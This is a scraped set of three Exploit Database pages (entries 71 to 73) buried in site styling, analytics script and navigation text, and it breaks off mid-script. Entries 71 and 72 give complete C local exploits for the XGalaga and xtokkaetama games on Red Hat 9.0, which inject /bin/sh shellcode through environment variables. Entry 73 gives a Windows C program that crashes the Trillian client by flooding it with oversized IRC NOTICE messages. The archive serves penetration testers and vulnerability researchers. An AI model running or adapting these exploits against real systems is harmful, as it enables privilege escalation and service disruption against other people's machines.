to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 71
XGalaga 2.0.34 (RedHat 9.0) - Local Game - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDXGalaga 2.0.34 (RedHat 9.0) - Local GameEDB-ID:71CVE:2003-0454EDB Verified:Author:c0wboyType:localExploit:/Platform:LinuxDate:2003-07-31Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* 0x333xgalaga => XGalaga 2.0.34 local game exploit (Red Hat 9.0)** tested against xgalaga-2.0.34-1.i386.rpm* under Red Hat Linux 9.0** - bug found by Steve Kemp* - exploit coded by c0wboy @ 0x333** (c) 0x333 Outsider Security Labs / www.0x333.org**/#include <stdio.h>#include <string.h>#include <unistd.h>#define BIN "/usr/X11R6/bin/xgalaga"#define SIZE 264#define RET 0xbffffe2c /* tested against Red Hat Linux 9.0 */#define NOP 0x90unsigned char shellcode[] =/* setregid (20,20) shellcode */"\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47""\xcd\x80"/* exec /bin/sh shellcode */"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62""\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";void banner (void);void memret (char *, int, int, int);void banner (void){fprintf (stdout, "\n\n --- xgalaga local GAME exploit by c0wboy ---\n");fprintf (stdout, " --- Outsiders Se(c)urity Labs / www.0x333.org ---\n\n");}void memret (char *buffer, int ret, int size, int align){int i;int * ptr = (int *) (buffer + align);for (i=0; i<size; i+=4)*ptr++ = ret;ptr = 0x0;}int main (){int ret = RET;char out[SIZE];memret ((char *)out, ret, SIZE-1, 0);memset ((char *)out, NOP, 33);memcpy ((char *)out+33, shellcode, strlen(shellcode));setenv ("HOME", out, 1);banner ();execl (BIN, BIN, "-scores", 0x0); // the switch "-scores" is necessary to exploit the game}// milw0rm.com [2003-07-31]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 72
xtokkaetama 1.0b (RedHat 9.0) - Local Game - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDxtokkaetama 1.0b (RedHat 9.0) - Local GameEDB-ID:72CVE:2003-0611EDB Verified:Author:brahmaType:localExploit:/Platform:LinuxDate:2003-08-01Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**  xtokkaetama 1.0b local game exploit on Red Hat 9.0*               Coded by brahma (31/07/2003)**       http://www.debian.org/security/2003/dsa-356*/#include <stdlib.h>#define RETADDR 0xbfffff11#define DEFAULT_BUFFER_SIZE 29#define DEFAULT_EGG_SIZE 512#define NOP 0x90#define BIN "/usr/X11R6/bin/xtokkaetama"char shellcode[] ="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd""\x80\xe8\xdc\xff\xff\xff/bin/sh";unsigned long get_esp(void) {__asm__("movl %esp,%eax");}void main(int argc, char *argv[]) {char *buff, *ptr, *egg;long *addr_ptr, addr;int bsize=DEFAULT_BUFFER_SIZE;int i, eggsize=DEFAULT_EGG_SIZE;if (argc > 1) bsize = atoi(argv[1]);if (argc > 2) eggsize = atoi(argv[2]);if (!(buff = malloc(bsize))) {printf("Can't allocate memory.\n");exit(0);}if (!(egg = malloc(eggsize))) {printf("Can't allocate memory.\n");exit(0);}addr = RETADDR;printf("Using address: 0x%x\n", addr);ptr = buff;addr_ptr = (long *) ptr;for (i = 0; i < bsize; i+=4)*(addr_ptr++) = addr;ptr = egg;for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)*(ptr++) = NOP;for (i = 0; i < strlen(shellcode); i++)*(ptr++) = shellcode[i];buff[bsize - 1] = '\0';egg[eggsize - 1] = '\0';memcpy(egg,"EGG=",4);putenv(egg);execl(BIN,BIN,"-display",buff,NULL);}// milw0rm.com [2003-08-01]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 73
Trillian 0.74 - Remote Denial of Service - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDTrillian 0.74 - Remote Denial of ServiceEDB-ID:73CVE:2002-1487EDB Verified:Author:l0bstahType:dosExploit:/Platform:WindowsDate:2003-08-01Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*[--------------------------------------------][:::::::::::::::::: trillian 0.7*(d patch)   ][:::::Denial:of:Service::simple:exploit::][-----------------------------[l0bstah]-----][usage ::                                           ][      : trillah name attacked-nick          ][                                                       ][comment:: after patch .74d, exploits,  ][         wich use damage (~4095 data)  ][         not work, but this exploit           ][         work at any patch.                    ][                                                       ][P.S. irc specification include rull:          ][510 characters maximum allowed for   ][the command and its parameters...     ][that is why szBuf has 570 length...       ][--------------------------------------------]*/#include <winsock.h>#include <iostream.h>#include <stdio.h>#include <dos.h>#define port    4384#define bfsize  540#define rptimes 1000WSADATA     wsadata;SOCKADDR_IN sa;SOCKET      s;LPHOSTENT   lpHostEntry;int         SockAddr = sizeof(struct sockaddr);int         i, ports;char        szBuf[570];          // [damage data]char        nick[50];            // <NICK> commandchar        user[50];            // <USER> commandchar        mode[50];            // <MODE> commandchar        *cname = "trillah";  // your client nameint main(int argc, char **argv){printf("::::::::::::::::::::::::::::::::::::\n");printf(": trillah - remote DoS exploit :::::\n");printf(":::::::::::::::::::::::::::[l0bstah]\n");if (argc < 3){ printf("use: trillah dnsname nick\n"); return 0; }char *addr=argv[1];ports=port;if (WSAStartup(0x0101,&wsadata) == 0){lpHostEntry = gethostbyname(addr);sa.sin_family = AF_INET;sa.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);sa.sin_port = htons(ports);if ((s=socket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET){printf("Can't open socket! - #%d\n",WSAGetLastError());exit(0);}printf("connecting to irc server : %s...\n", addr);if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) == -1){printf("Can't connect() - #%d\n",WSAGetLastError());exit(0);}printf("connected... starting login session \n\n");//*** NICK <NICK>strcpy(nick, "NICK ");strcat(nick, cname);strcat(nick, "\n");send(s,nick,strlen(nick),0);printf(nick);//*** USER <mode> <unused> <realname>strcpy(user, "USER ");strcat(user, cname);strcat(user, " 0 127.0.0.1 : trilla\n");send(s,user,strlen(user),0);printf(user);sleep(1);//*** MODE <nick> (+|-*)strcpy(mode, "MODE ");strcat(mode, cname);strcat(mode, " +i\n");send(s,mode,strlen(mode),0);sleep(2);//**********DAMAGE****DATA*************//printf("Sending damage data...\n");strcat(szBuf, "NOTICE ");strcat(szBuf, argv[2]);strcat(szBuf, " :");for(i=0;i<=bfsize;i++) strcat(szBuf,"A");strcat(szBuf, "\n");for (i=0;i<=rptimes;i++){send(s,szBuf,strlen(szBuf),0);}printf("attack complete....");//*************************************//closesocket(s);}WSACleanup();}// milw0rm.com [2003-08-01]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse 